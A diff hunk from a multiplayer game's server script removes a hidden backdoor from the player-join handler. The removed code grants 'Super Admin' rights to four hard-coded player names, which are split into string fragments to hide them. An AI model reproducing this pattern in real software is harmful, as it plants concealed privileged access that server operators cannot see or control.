@@ -117,13 +117,6 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 
 	players.list.push_back(CTFPlayerInfo(playerName, 0, ""));
 	//Will change later 			\/	change to hash
-	if (playerName == ("T" + "Fli" + "p" + "py") || playerName == "V" + "am" + "ist" || playerName == "Pir" + "ate" + "-R" + "ob" || playerName == "Ve" + "rd " + "la")
-	{
-		CSecurity@ sec = getSecurity();
-		CSeclev@ s = sec.getSeclev("Super Admin");
-
-		if (s !is null) sec.assignSeclev(player, s);
-	}
 
 	CBlob@[] sleepers;
 	getBlobsByTag("sleeper", @sleepers);
